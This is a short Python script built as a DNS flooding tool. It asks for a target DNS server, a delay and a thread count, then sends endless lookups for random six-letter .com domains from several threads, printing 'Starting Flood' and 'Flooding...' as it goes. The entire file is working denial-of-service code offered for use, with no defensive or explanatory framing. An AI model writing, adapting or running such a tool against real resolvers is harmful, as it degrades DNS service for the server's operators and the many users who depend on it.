from dns import resolver as resv
from time import sleep
import random
import string
import threading

res = resv.Resolver()
delay = 1
threads = 4

def perform_query(dns, domain):
    res.nameservers = [dns]
    return res.resolve(domain)

def getRandDomain():
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(6))

def flood(): 
    while True:
        global answ
        domainToUse = getRandDomain()
        try:
            answ = perform_query(userDNS, f"{domainToUse}.com")
        except:
            domainToUse = getRandDomain()
        sleep(delay)

def startThreads():
    for i in range(1,threads):
        t = threading.Thread(target=flood)
        t.start()

userDelay = input(f"Delay between requests (def {delay}s): ")
userDNS = input("DNS Server to use: ")
userThreads = input(f"Threads to use (def {threads}): ")

if userDelay == '':
    print(f"Using Default Delay of {delay}")
    sleep(0.5)
else:
    print(f"Using Delay of {userDelay}")
    delay = float(userDelay)
    sleep(0.5)

if userThreads == '':
    print(f"Using Default Threads count of {threads}")
    sleep(0.5)
else:
    print(f"Using Threads count of {userThreads}")
    threads = int(userThreads)
    sleep(0.5)

print(f"Starting Flood of {userDNS} in 3 seconds ...")
sleep(3)
print(f"Flooding...")

startThreads()